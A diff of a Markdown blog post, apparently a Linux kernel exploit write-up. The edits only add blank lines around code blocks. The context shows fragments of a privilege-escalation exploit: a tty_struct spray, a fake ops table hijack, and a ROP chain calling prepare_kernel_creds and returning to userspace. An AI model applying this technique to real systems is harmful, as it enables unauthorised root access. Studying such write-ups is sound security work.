@@ -298,6 +298,7 @@ We note the following:
 * At the end of the struct, there are 0x148 of "empty" bytes (all zeros) - remember those for later.
 ## Getting code execution
 As we can see the `tty_struct` has a `ops` pointer, which point to the following struct:
+
 ```c
 
 struct tty_operations {
@@ -377,6 +378,7 @@ To use the gadget, I crafted a fake `ops` table (containing 14 functions - all t
 ![Pasted image 20230916005818](https://github.com/0xAriana/blog/assets/121199478/466424f7-6c2f-4197-bbaa-0cff57be8448)
 
 I trigger the write callback by calling `write` to all the opened `tty_struct` file descriptors from the spraying phase:
+
 ```c
 
     for (int i = 0; i < 0x100; ++i) {
@@ -416,6 +418,7 @@ This part is pretty standard:
 3. Call [swapgs_restore_regs_and_return_to_usermode](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/entry/entry_64.S) with the return user space context ready on the stack: RIP, CS, EFLAGS, RSP, SS.
 
 * At the beginning of main, I've set the context I want to return to in the function `setup_iretq_context`:
+* 
 ```c
 
 unsigned long cs;
@@ -439,6 +442,7 @@ void setup_iretq_context() {
 ```
 
 The Rop looks something like this:
+
 ```c
     unsigned long pe_and_ret_to_userspace_rop[] = {pop_rdi_address, 0, prepare_kernel_creds_f,
                                                    xchg_rdi_rax_address,
@@ -454,6 +458,7 @@ The Rop looks something like this:
 
 ## Putting it all together
 Here's the final code:
+
 ```c
 
 #include <stdio.h>
